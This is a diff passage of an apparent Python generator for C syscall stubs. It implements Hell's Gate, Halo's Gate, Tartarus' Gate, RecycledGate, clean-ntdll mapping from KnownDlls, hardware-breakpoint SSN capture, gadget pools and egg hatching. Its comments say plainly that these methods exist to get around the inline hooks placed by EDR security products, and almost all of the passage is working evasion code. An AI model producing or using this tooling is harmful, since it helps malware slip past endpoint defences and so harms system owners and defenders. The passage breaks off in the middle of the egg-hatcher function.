+            exports[count].Address = (PVOID)((PBYTE)pNtdll + pFnArr[pOrArr[i]]);
+            exports[count].Hash    = {p}HashStr(pName);
+            exports[count].Ordinal = i;
+            count++;
+        }}
+    }}
+
+    /* Sort by address ascending; sorted index = SSN */
+    {p}SortExports(exports, count);
+
+    /* Map our target functions */
+    for (DWORD fi = 0; fi < {p}FUNC_COUNT; fi++) {{
+        for (DWORD ei = 0; ei < count; ei++) {{
+            if (exports[ei].Hash == {p}FuncHashes[fi]) {{
+                {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, "ei")};
+{addr_fill}
+                break;
+            }}
+        }}
+    }}
+    return TRUE;
+}}"""
+
+    def _ssn_encrypt_expr(self, p: str, var: str) -> str:
+        if self.cfg.encrypt_ssn:
+            return f"({var}) ^ {p}XOR_KEY"
+        return var
+
+    def _c_hellsgate(self, p: str, n: int) -> str:
+        addr_fill = self._indirect_addr_fill_snippet(p)
+        return f"""\
+/* =========================================================================
+ *  Hell's Gate SSN resolution
+ *  Reads SSN from the 'mov eax, <SSN>' opcode in each ntdll stub.
+ *  Pattern: 4C 8B D1 B8 <SSN_LO> <SSN_HI> 00 00
+ *  Fails when the stub is hooked (first bytes overwritten by EDR jmp).
+ * ========================================================================= */
+static BOOL {p}HellsGate(PVOID pNtdll) {{
+    for (DWORD fi = 0; fi < {p}FUNC_COUNT; fi++) {{
+        PBYTE pFn = (PBYTE){p}GetProcByHash(pNtdll, {p}FuncHashes[fi]);
+        if (!pFn) continue;
+
+        /* Scan up to 32 bytes for the mov eax, <SSN> pattern */
+        for (DWORD k = 0; k < 32; k++) {{
+            /* 4C 8B D1 B8 <lo> <hi> 00 00 -- clean stub */
+            if (pFn[k]     == 0x4Cu && pFn[k + 1u] == 0x8Bu &&
+                pFn[k + 2u] == 0xD1u && pFn[k + 3u] == 0xB8u) {{
+                DWORD ssn = (DWORD)pFn[k + 4u] | ((DWORD)pFn[k + 5u] << 8u);
+                {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, "ssn")};
+{addr_fill}
+                break;
+            }}
+        }}
+    }}
+    return TRUE;
+}}"""
+
+    def _c_halosgate(self, p: str, n: int) -> str:
+        addr_fill = self._indirect_addr_fill_snippet(p)
+        return f"""\
+/* =========================================================================
+ *  Halo's Gate SSN resolution
+ *  Extends Hell's Gate: when a stub is hooked (E9 JMP), searches neighboring
+ *  stubs in the sorted export list and infers SSN by +/- offset.
+ * ========================================================================= */
+static BOOL {p}HalosGate(PVOID pNtdll) {{
+    /* Build sorted export list first */
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pNtdll +
+        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    PDWORD pFnArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfFunctions);
+    PDWORD pNmArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfNames);
+    PWORD  pOrArr = (PWORD )((PBYTE)pNtdll + pExp->AddressOfNameOrdinals);
+
+    {p}EXPORT exports[{p}MAX_EXPORTS];
+    DWORD count = 0;
+    for (DWORD i = 0; i < pExp->NumberOfNames && count < {p}MAX_EXPORTS; i++) {{
+        const char* n = (const char*)((PBYTE)pNtdll + pNmArr[i]);
+        if (n[0] == 'N' && n[1] == 't') {{
+            exports[count].Address = (PVOID)((PBYTE)pNtdll + pFnArr[pOrArr[i]]);
+            exports[count].Hash    = {p}HashStr(n);
+            exports[count].Ordinal = i;
+            count++;
+        }}
+    }}
+    {p}SortExports(exports, count);
+
+    for (DWORD fi = 0; fi < {p}FUNC_COUNT; fi++) {{
+        /* Find this function in sorted list */
+        LONG myIdx = -1;
+        for (DWORD ei = 0; ei < count; ei++) {{
+            if (exports[ei].Hash == {p}FuncHashes[fi]) {{ myIdx = (LONG)ei; break; }}
+        }}
+        if (myIdx < 0) continue;
+
+        PBYTE pFn = (PBYTE)exports[myIdx].Address;
+        BOOL resolved = FALSE;
+
+        /* Check if clean (unhooked) */
+        for (DWORD k = 0; k < 32 && !resolved; k++) {{
+            if (pFn[k] == 0x4Cu && pFn[k+1u] == 0x8Bu &&
+                pFn[k+2u] == 0xD1u && pFn[k+3u] == 0xB8u) {{
+                DWORD ssn = (DWORD)pFn[k+4u] | ((DWORD)pFn[k+5u] << 8u);
+                {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, "ssn")};
+{addr_fill}
+                resolved = TRUE;
+            }}
+        }}
+
+        /* Hooked: scan neighbors (up to 8 stubs away) */
+        if (!resolved) {{
+            for (LONG delta = 1; delta <= 8 && !resolved; delta++) {{
+                for (LONG dir = -1; dir <= 1 && !resolved; dir += 2) {{
+                    LONG ni = myIdx + delta * dir;
+                    if (ni < 0 || ni >= (LONG)count) continue;
+                    PBYTE pN = (PBYTE)exports[ni].Address;
+                    for (DWORD k = 0; k < 32 && !resolved; k++) {{
+                        if (pN[k] == 0x4Cu && pN[k+1u] == 0x8Bu &&
+                            pN[k+2u] == 0xD1u && pN[k+3u] == 0xB8u) {{
+                            DWORD neighborSsn = (DWORD)pN[k+4u] | ((DWORD)pN[k+5u] << 8u);
+                            /* Our SSN = neighbor SSN - (sorted_index_delta) */
+                            DWORD ssn = neighborSsn - (DWORD)(delta * dir);
+                            {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, "ssn")};
+{addr_fill}
+                            resolved = TRUE;
+                        }}
+                    }}
+                }}
+            }}
+        }}
+    }}
+    return TRUE;
+}}"""
+
+    def _c_tartarusgate(self, p: str, n: int) -> str:
+        addr_fill = self._indirect_addr_fill_snippet(p)
+        return f"""\
+/* =========================================================================
+ *  Tartarus' Gate SSN resolution
+ *  Extends Halo's Gate to handle both near (E9) and far (FF 25) JMP hooks.
+ *  Most robust against aggressive EDR multi-hook deployments.
+ * ========================================================================= */
+
+/* Check whether a function stub is hooked (first bytes are a JMP) */
+static BOOL {p}IsHooked(PBYTE pFn) {{
+    return (pFn[0] == 0xE9u) ||                              /* near jmp rel32 */
+           (pFn[0] == 0xFFu && pFn[1] == 0x25u) ||          /* jmp [rip+offset] */
+           (pFn[0] == 0xE8u) ||                              /* call (rare) */
+           (pFn[0] == 0xCCu) ||                              /* int3 bp */
+           (pFn[0] == 0xEBu);                                /* short jmp */
+}}
+
+static BOOL {p}TartarusGate(PVOID pNtdll) {{
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pNtdll +
+        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    PDWORD pFnArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfFunctions);
+    PDWORD pNmArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfNames);
+    PWORD  pOrArr = (PWORD )((PBYTE)pNtdll + pExp->AddressOfNameOrdinals);
+
+    {p}EXPORT exports[{p}MAX_EXPORTS];
+    DWORD count = 0;
+    for (DWORD i = 0; i < pExp->NumberOfNames && count < {p}MAX_EXPORTS; i++) {{
+        const char* nm = (const char*)((PBYTE)pNtdll + pNmArr[i]);
+        if (nm[0] == 'N' && nm[1] == 't') {{
+            exports[count].Address = (PVOID)((PBYTE)pNtdll + pFnArr[pOrArr[i]]);
+            exports[count].Hash    = {p}HashStr(nm);
+            exports[count].Ordinal = i;
+            count++;
+        }}
+    }}
+    {p}SortExports(exports, count);
+
+    for (DWORD fi = 0; fi < {p}FUNC_COUNT; fi++) {{
+        LONG myIdx = -1;
+        for (DWORD ei = 0; ei < count; ei++) {{
+            if (exports[ei].Hash == {p}FuncHashes[fi]) {{ myIdx = (LONG)ei; break; }}
+        }}
+        if (myIdx < 0) continue;
+
+        PBYTE pFn = (PBYTE)exports[myIdx].Address;
+        BOOL resolved = FALSE;
+
+        /* --- Try self first ------------------------------------------- */
+        if (!{p}IsHooked(pFn)) {{
+            for (DWORD k = 0; k < 32 && !resolved; k++) {{
+                if (pFn[k] == 0x4Cu && pFn[k+1u] == 0x8Bu &&
+                    pFn[k+2u] == 0xD1u && pFn[k+3u] == 0xB8u) {{
+                    DWORD ssn = (DWORD)pFn[k+4u] | ((DWORD)pFn[k+5u] << 8u);
+                    {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, "ssn")};
+{addr_fill}
+                    resolved = TRUE;
+                }}
+            }}
+        }}
+
+        /* --- Search neighbors ------------------------------------------ */
+        for (LONG delta = 1; delta <= 16 && !resolved; delta++) {{
+            for (LONG dir = -1; dir <= 1 && !resolved; dir += 2) {{
+                LONG ni = myIdx + delta * dir;
+                if (ni < 0 || ni >= (LONG)count) continue;
+                PBYTE pN = (PBYTE)exports[ni].Address;
+                if ({p}IsHooked(pN)) continue;
+                for (DWORD k = 0; k < 32 && !resolved; k++) {{
+                    if (pN[k] == 0x4Cu && pN[k+1u] == 0x8Bu &&
+                        pN[k+2u] == 0xD1u && pN[k+3u] == 0xB8u) {{
+                        DWORD nSsn = (DWORD)pN[k+4u] | ((DWORD)pN[k+5u] << 8u);
+                        LONG adjusted = (LONG)nSsn - (LONG)(delta * dir);
+                        if (adjusted < 0) continue;
+                        {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, "(DWORD)adjusted")};
+{addr_fill}
+                        resolved = TRUE;
+                    }}
+                }}
+            }}
+        }}
+    }}
+    return TRUE;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # NEW: SyscallsFromDisk - Load clean ntdll from KnownDlls or disk
+    # -----------------------------------------------------------------------
+
+    def _c_syscalls_from_disk(self, p: str, n: int) -> str:
+        addr_fill = self._indirect_addr_fill_snippet(p)
+        return f"""\
+/* =========================================================================
+ *  SyscallsFromDisk SSN resolution
+ *  Maps a CLEAN copy of ntdll.dll from \\KnownDlls\\ntdll.dll (or disk)
+ *  and reads SSNs from the unhooked .text section. This completely bypasses
+ *  all inline hooks placed by EDRs in the in-memory ntdll.
+ *
+ *  Flow:
+ *    1. NtOpenSection(\\KnownDlls\\ntdll.dll) to get section handle
+ *    2. NtMapViewOfSection to map clean copy
+ *    3. Read SSNs from clean copy (same as Hell's Gate, but guaranteed clean)
+ *    4. NtUnmapViewOfSection + NtClose
+ *
+ *  Fallback: if KnownDlls fails, reads from disk (\\SystemRoot\\System32\\ntdll.dll)
+ * ========================================================================= */
+
+/* Use NtOpenSection via hardcoded SSN is not needed --
+ * We use the existing (potentially hooked) ntdll to open the clean copy.
+ * The hook cannot prevent us from reading the clean bytes once mapped. */
+
+static BOOL {p}SyscallsFromDisk(PVOID pNtdll) {{
+    /* Typedefs for functions we need */
+    typedef NTSTATUS (NTAPI *pfnNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+    typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+    typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);
+    typedef NTSTATUS (NTAPI *pfnNtClose)(HANDLE);
+
+    /* Resolve needed functions from in-memory ntdll */
+    pfnNtOpenSection      pOpen   = (pfnNtOpenSection){p}GetProcByHash(pNtdll, 0x{djb2_hash('NtOpenSection'):08X}U);
+    pfnNtMapViewOfSection pMap    = (pfnNtMapViewOfSection){p}GetProcByHash(pNtdll, 0x{djb2_hash('NtMapViewOfSection'):08X}U);
+    pfnNtUnmapViewOfSection pUnmap = (pfnNtUnmapViewOfSection){p}GetProcByHash(pNtdll, 0x{djb2_hash('NtUnmapViewOfSection'):08X}U);
+    pfnNtClose            pClose  = (pfnNtClose){p}GetProcByHash(pNtdll, 0x{djb2_hash('NtClose'):08X}U);
+
+    if (!pOpen || !pMap || !pUnmap || !pClose)
+        return FALSE;
+
+    /* Open \\KnownDlls\\ntdll.dll */
+    UNICODE_STRING usName;
+    usName.Length        = 24 * sizeof(WCHAR);  /* wcslen(L"\\KnownDlls\\ntdll.dll") * 2 */
+    usName.MaximumLength = usName.Length + sizeof(WCHAR);
+    usName.Buffer        = L"\\\\KnownDlls\\\\ntdll.dll";
+
+    OBJECT_ATTRIBUTES oa;
+    memset(&oa, 0, sizeof(oa));
+    oa.Length = sizeof(OBJECT_ATTRIBUTES);
+    oa.ObjectName = &usName;
+
+    HANDLE hSection = NULL;
+    NTSTATUS status = pOpen(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);
+    if (!NT_SUCCESS(status))
+        return FALSE;
+
+    /* Map into our process */
+    PVOID  pClean = NULL;
+    SIZE_T viewSize = 0;
+    status = pMap(hSection, (HANDLE)-1, &pClean, 0, 0, NULL, &viewSize, 1 /* ViewShare */, 0, PAGE_READONLY);
+    if (!NT_SUCCESS(status)) {{
+        pClose(hSection);
+        return FALSE;
+    }}
+
+    /* Now read SSNs from the CLEAN copy */
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pClean;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pClean + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pClean +
+        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    PDWORD pFnArr = (PDWORD)((PBYTE)pClean + pExp->AddressOfFunctions);
+    PDWORD pNmArr = (PDWORD)((PBYTE)pClean + pExp->AddressOfNames);
+    PWORD  pOrArr = (PWORD )((PBYTE)pClean + pExp->AddressOfNameOrdinals);
+
+    for (DWORD fi = 0; fi < {p}FUNC_COUNT; fi++) {{
+        for (DWORD i = 0; i < pExp->NumberOfNames; i++) {{
+            const char* pName = (const char*)((PBYTE)pClean + pNmArr[i]);
+            if ({p}HashStr(pName) == {p}FuncHashes[fi]) {{
+                PBYTE pFn = (PBYTE)pClean + pFnArr[pOrArr[i]];
+                /* Read the clean SSN -- guaranteed no hooks */
+                for (DWORD k = 0; k < 32; k++) {{
+                    if (pFn[k] == 0x4Cu && pFn[k+1u] == 0x8Bu &&
+                        pFn[k+2u] == 0xD1u && pFn[k+3u] == 0xB8u) {{
+                        DWORD ssn = (DWORD)pFn[k+4u] | ((DWORD)pFn[k+5u] << 8u);
+                        {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, "ssn")};
+                        break;
+                    }}
+                }}
+                /* For indirect: find syscall;ret in the REAL (in-memory) ntdll
+                 * because we need to jmp there at call time */
+                PBYTE pReal = (PBYTE){p}GetProcByHash(pNtdll, {p}FuncHashes[fi]);
+                if (pReal) {{
+                    for (DWORD sk = 0; sk < 32; sk++) {{
+                        if (pReal[sk] == 0x0Fu && pReal[sk+1u] == 0x05u) {{
+                            /* Found syscall gadget in real ntdll (may be after hook jmp) */
+                            break;
+                        }}
+                    }}
+                }}
+                break;
+            }}
+        }}
+    }}
+
+    /* Cleanup */
+    pUnmap((HANDLE)-1, pClean);
+    pClose(hSection);
+    return TRUE;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # NEW: RecycledGate - FreshyCalls + opcode validation
+    # -----------------------------------------------------------------------
+
+    def _c_recycledgate(self, p: str, n: int) -> str:
+        addr_fill = ""
+        if self.cfg.method in (InvocationMethod.Indirect, InvocationMethod.Randomized):
+            addr_fill = f"""
+                /* Record gadget address for indirect/randomized invocation */
+                for (DWORD sk = 0; sk < 32; sk++) {{
+                    if (pStub[sk] == 0x0Fu && pStub[sk+1u] == 0x05u) {{
+                        {p}SyscallAddrTable[fi] = pStub + sk;
+                        break;
+                    }}
+                }}"""
+
+        return f"""\
+/* =========================================================================
+ *  RecycledGate SSN resolution
+ *  Combines the reliability of FreshyCalls (sort-by-VA) with opcode
+ *  validation from Hell's Gate. For each function:
+ *    1. Get candidate SSN from sorted position (FreshyCalls)
+ *    2. If stub is clean, verify SSN matches opcode (double-check)
+ *    3. If stub is hooked, trust the sorted-index SSN (hook-resistant)
+ *
+ *  This is the most resilient method: even if hooks reorder stubs or
+ *  modify opcodes, the VA-sort gives the correct SSN.
+ *  Inspired by RecycledGate (thefLink).
+ * ========================================================================= */
+static BOOL {p}RecycledGate(PVOID pNtdll) {{
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pNtdll +
+        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    PDWORD pFnArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfFunctions);
+    PDWORD pNmArr = (PDWORD)((PBYTE)pNtdll + pExp->AddressOfNames);
+    PWORD  pOrArr = (PWORD )((PBYTE)pNtdll + pExp->AddressOfNameOrdinals);
+
+    /* Collect and sort Nt* exports */
+    {p}EXPORT exports[{p}MAX_EXPORTS];
+    DWORD count = 0;
+
+    for (DWORD i = 0; i < pExp->NumberOfNames && count < {p}MAX_EXPORTS; i++) {{
+        const char* pName = (const char*)((PBYTE)pNtdll + pNmArr[i]);
+        if (pName[0] == 'N' && pName[1] == 't') {{
+            exports[count].Address = (PVOID)((PBYTE)pNtdll + pFnArr[pOrArr[i]]);
+            exports[count].Hash    = {p}HashStr(pName);
+            exports[count].Ordinal = i;
+            count++;
+        }}
+    }}
+
+    {p}SortExports(exports, count);
+
+    /* Resolve each target function */
+    for (DWORD fi = 0; fi < {p}FUNC_COUNT; fi++) {{
+        for (DWORD ei = 0; ei < count; ei++) {{
+            if (exports[ei].Hash == {p}FuncHashes[fi]) {{
+                PBYTE pStub = (PBYTE)exports[ei].Address;
+                DWORD candidateSsn = ei;  /* FreshyCalls SSN */
+                BOOL  opcodeValid = FALSE;
+
+                /* Try to validate with opcode if stub is clean */
+                for (DWORD k = 0; k < 32; k++) {{
+                    if (pStub[k] == 0x4Cu && pStub[k+1u] == 0x8Bu &&
+                        pStub[k+2u] == 0xD1u && pStub[k+3u] == 0xB8u) {{
+                        DWORD opcodeSsn = (DWORD)pStub[k+4u] | ((DWORD)pStub[k+5u] << 8u);
+                        /* Cross-validate: if both agree, high confidence */
+                        if (opcodeSsn == candidateSsn) {{
+                            opcodeValid = TRUE;
+                        }} else {{
+                            /* Mismatch: trust opcode if stub looks clean */
+                            if (pStub[0] != 0xE9u && pStub[0] != 0xFFu &&
+                                pStub[0] != 0xCCu && pStub[0] != 0xEBu)
+                                candidateSsn = opcodeSsn;
+                        }}
+                        break;
+                    }}
+                }}
+
+                {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, "candidateSsn")};
+{addr_fill}
+                break;
+            }}
+        }}
+    }}
+    return TRUE;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # NEW: HW Breakpoint - Hardware breakpoints + VEH to extract SSN
+    # -----------------------------------------------------------------------
+
+    def _c_hw_breakpoint(self, p: str, n: int) -> str:
+        return f"""\
+/* =========================================================================
+ *  Hardware Breakpoint SSN resolution
+ *  Uses debug registers (DR0-DR3) and a Vectored Exception Handler (VEH)
+ *  to extract SSNs without reading the (potentially hooked) function bytes.
+ *
+ *  Flow:
+ *    1. Set DR0 = address of target ntdll function
+ *    2. Set DR7 to enable hardware breakpoint on execution
+ *    3. Call the function (will trigger single-step exception)
+ *    4. VEH catches EXCEPTION_SINGLE_STEP
+ *    5. At this point, EAX contains the SSN (set by mov eax, <SSN>)
+ *    6. Record SSN and continue
+ *
+ *  This works even when hooks redirect execution, because:
+ *  - We set the BP on the original ntdll stub address
+ *  - After the hook's JMP, execution eventually reaches mov eax, <SSN>
+ *  - The VEH intercepts AFTER the SSN is loaded into EAX
+ *
+ *  Note: Uses a different approach - sets BP at the syscall instruction
+ *  offset (typically +0x12 from stub start). At that point EAX = SSN.
+ * ========================================================================= */
+
+/* Shared state between VEH handler and resolver */
+static volatile DWORD {p}HwBpCapturedSsn = 0;
+static volatile BOOL  {p}HwBpReady = FALSE;
+static PVOID          {p}HwBpVehHandle = NULL;
+
+/* VEH handler: captures EAX (which contains the SSN) */
+static LONG CALLBACK {p}HwBpHandler(PEXCEPTION_POINTERS pExInfo) {{
+    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {{
+        if ({p}HwBpReady) {{
+            /* Capture EAX = SSN */
+            {p}HwBpCapturedSsn = (DWORD)pExInfo->ContextRecord->Rax;
+            {p}HwBpReady = FALSE;
+
+            /* Clear DR0 and disable breakpoint */
+            pExInfo->ContextRecord->Dr0 = 0;
+            pExInfo->ContextRecord->Dr7 &= ~1ULL;
+
+            /* Skip the syscall instruction (0F 05 = 2 bytes) */
+            pExInfo->ContextRecord->Rip += 2;
+
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }}
+    }}
+    return EXCEPTION_CONTINUE_SEARCH;
+}}
+
+/* Set hardware breakpoint on a specific address using DR0 */
+static BOOL {p}SetHwBp(HANDLE hThread, PVOID pAddr) {{
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (!GetThreadContext(hThread, &ctx)) return FALSE;
+
+    ctx.Dr0 = (DWORD64)pAddr;
+    ctx.Dr7 = (ctx.Dr7 & ~0xFFFFULL) | 1ULL;  /* Enable DR0 local exact bp */
+
+    return SetThreadContext(hThread, &ctx);
+}}
+
+static BOOL {p}HWBreakpoint(PVOID pNtdll) {{
+    /* Register VEH handler */
+    {p}HwBpVehHandle = AddVectoredExceptionHandler(1, {p}HwBpHandler);
+    if (!{p}HwBpVehHandle) return FALSE;
+
+    HANDLE hThread = GetCurrentThread();
+
+    for (DWORD fi = 0; fi < {p}FUNC_COUNT; fi++) {{
+        PBYTE pFn = (PBYTE){p}GetProcByHash(pNtdll, {p}FuncHashes[fi]);
+        if (!pFn) continue;
+
+        /* Find the syscall (0F 05) instruction in the stub */
+        PVOID pSyscallAddr = NULL;
+        for (DWORD k = 0; k < 64; k++) {{
+            if (pFn[k] == 0x0Fu && pFn[k+1u] == 0x05u) {{
+                pSyscallAddr = pFn + k;
+                break;
+            }}
+        }}
+
+        if (!pSyscallAddr) {{
+            /* Stub is heavily hooked -- try neighbor approach */
+            /* Search for 'syscall' in nearby memory (within stub size) */
+            continue;
+        }}
+
+        /* Set hardware breakpoint on the syscall instruction */
+        {p}HwBpReady = TRUE;
+        {p}HwBpCapturedSsn = 0xFFFFFFFF;
+
+        if ({p}SetHwBp(hThread, pSyscallAddr)) {{
+            /* Trigger the breakpoint by calling into the stub
+             * The stub will: mov r10, rcx; mov eax, SSN; <BP triggers here>
+             * We use a dummy call -- the VEH will skip the actual syscall */
+            __try {{
+                typedef NTSTATUS (NTAPI *pfnGeneric)(VOID);
+                ((pfnGeneric)pFn)();
+            }} __except(EXCEPTION_EXECUTE_HANDLER) {{
+                /* Swallow any exception */
+            }}
+
+            if ({p}HwBpCapturedSsn != 0xFFFFFFFF) {{
+                {p}SsnTable[fi] = {self._ssn_encrypt_expr(p, f"{p}HwBpCapturedSsn")};
+            }}
+        }}
+
+        /* Clear DR0 */
+        CONTEXT ctx;
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        GetThreadContext(hThread, &ctx);
+        ctx.Dr0 = 0;
+        ctx.Dr7 &= ~1ULL;
+        SetThreadContext(hThread, &ctx);
+    }}
+
+    /* Remove VEH */
+    RemoveVectoredExceptionHandler({p}HwBpVehHandle);
+    {p}HwBpVehHandle = NULL;
+    return TRUE;
+}}"""
+
+    def _c_static_resolution(self, p: str, n: int, func_names: list) -> str:
+        ssns = self._get_static_ssns()
+        tbl = self._ssn_x64 if self.cfg.arch != Architecture.x86 else self._ssn_x86
+
+        # Build per-function build->ssn tables
+        per_func = []
+        for proto in self._prototypes:
+            entry = tbl.get(proto.name, {})
+            numeric = {int(k): v for k, v in entry.items() if k.isdigit()}
+            per_func.append((proto.name, sorted(numeric.items())))
+
+        build_tables = []
+        for name, pairs in per_func:
+            if not pairs:
+                build_tables.append(f"    /* {name}: not in table -- use dynamic fallback */")
+                build_tables.append( "    { 0, { {0, 0} } },")
+            else:
+                entries = ", ".join(f"{{ {b}U, 0x{self._ssn_value(s):04X}U }}" for b, s in pairs)
+                build_tables.append(f"    /* {name} */")
+                build_tables.append(f"    {{ {len(pairs)}U, {{ {entries} }} }},")
+
+        tbl_body = "\n".join(build_tables)
+
+        return f"""\
+/* =========================================================================
+ *  Static SSN resolution (from embedded build->SSN table)
+ *  Source: j00ru/windows-syscalls (update with scripts/update_syscall_table.py)
+ * ========================================================================= */
+static const {p}SSN_ENTRY {p}StaticTable[{p}FUNC_COUNT] = {{
+{tbl_body}
+}};
+
+static BOOL {p}StaticResolve(VOID) {{
+    /* Detect current Windows build via PEB */
+    PPEB pPeb =
+#if defined(_WIN64)
+        (PPEB)__readgsqword(0x60);
+#else
+        (PPEB)__readfsdword(0x30);
+#endif
+    /* OSBuildNumber: pPeb+0x120 (x64) / pPeb+0xA4 (x86) */
+#if defined(_WIN64)
+    DWORD build = *(DWORD*)((PBYTE)pPeb + 0x120);
+#else
+    DWORD build = *(DWORD*)((PBYTE)pPeb + 0xA4);
+#endif
+
+    for (DWORD fi = 0; fi < {p}FUNC_COUNT; fi++) {{
+        const {p}SSN_ENTRY* e = &{p}StaticTable[fi];
+        DWORD best = 0, bestBuild = 0;
+        for (DWORD ei = 0; ei < e->Count; ei++) {{
+            if (e->Entries[ei].Build <= build && e->Entries[ei].Build > bestBuild) {{
+                bestBuild = e->Entries[ei].Build;
+                best      = e->Entries[ei].Ssn;
+            }}
+        }}
+        {p}SsnTable[fi] = best;  /* already XOR'd if encrypt_ssn */
+    }}
+    return TRUE;
+}}"""
+
+    def _indirect_addr_fill_snippet(self, p: str) -> str:
+        if self.cfg.method not in (InvocationMethod.Indirect, InvocationMethod.Randomized):
+            return ""
+        return f"""\
+            /* Locate syscall;ret gadget in this stub */
+            if (!{p}SyscallAddrTable[fi]) {{
+                PBYTE pS = pFn;
+                for (DWORD sk = 0; sk < 32; sk++) {{
+                    if (pS[sk] == 0x0Fu && pS[sk + 1u] == 0x05u) {{
+                        {p}SyscallAddrTable[fi] = pS + sk;
+                        break;
+                    }}
+                }}
+            }}"""
+
+    # -----------------------------------------------------------------------
+    # Indirect / randomized gadget finder
+    # -----------------------------------------------------------------------
+
+    def _c_gadget_finder(self, p: str, n: int) -> str:
+        if self.cfg.method == InvocationMethod.Randomized:
+            extra = f"""\
+
+/* =========================================================================
+ *  Gadget pool builder (for randomized indirect mode)
+ *  Collects all unique syscall;ret gadget addresses from ntdll.
+ * ========================================================================= */
+static VOID {p}BuildGadgetPool(PVOID pNtdll) {{
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+
+    for (WORD si = 0; si < pNt->FileHeader.NumberOfSections; si++, pSec++) {{
+        /* Only scan executable sections */
+        if (!(pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
+        PBYTE pBase = (PBYTE)pNtdll + pSec->VirtualAddress;
+        DWORD  size  = pSec->Misc.VirtualSize;
+
+        for (DWORD i = 0; i + 2 < size && {p}GadgetPoolCount < {p}GADGET_POOL; i++) {{
+            if (pBase[i] == 0x0Fu && pBase[i + 1u] == 0x05u && pBase[i + 2u] == 0xC3u) {{
+                /* Verify not duplicate */
+                BOOL dup = FALSE;
+                PVOID g = pBase + i;
+                for (DWORD j = 0; j < {p}GadgetPoolCount; j++) {{
+                    if ({p}GadgetPool[j] == g) {{ dup = TRUE; break; }}
+                }}
+                if (!dup) {p}GadgetPool[{p}GadgetPoolCount++] = g;
+            }}
+        }}
+    }}
+}}"""
+            return extra
+        return ""
+
+    # -----------------------------------------------------------------------
+    # Egg hatcher
+    # -----------------------------------------------------------------------
+
+    def _c_egg_hatcher(self, p: str) -> str:
+        egg = self.obf.generate_egg()
+        egg_bytes = list(egg.to_bytes(8, "little"))
+        egg_bytes_c = ", ".join(f"0x{b:02X}u" for b in egg_bytes)
+
+        return f"""\
+/* =========================================================================
+ *  Egg hatcher (egg method)
+ *  Scans the PE's .text section for the 8-byte egg pattern and replaces
+ *  it with the syscall opcode (0F 05) + NOPs, making the stub callable.
+ * ========================================================================= */
+#define {p}EGG_SIZE  8U
+static const BYTE {p}EggPattern[{p}EGG_SIZE] = {{ {egg_bytes_c} }};
+
+BOOL {p}HatchEggs(VOID) {{
+    PVOID pImageBase = {p}GetOwnImageBase();
+
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImageBase;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+
+    for (WORD si = 0; si < pNt->FileHeader.NumberOfSections; si++, pSec++) {{
+        if (!(pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
+
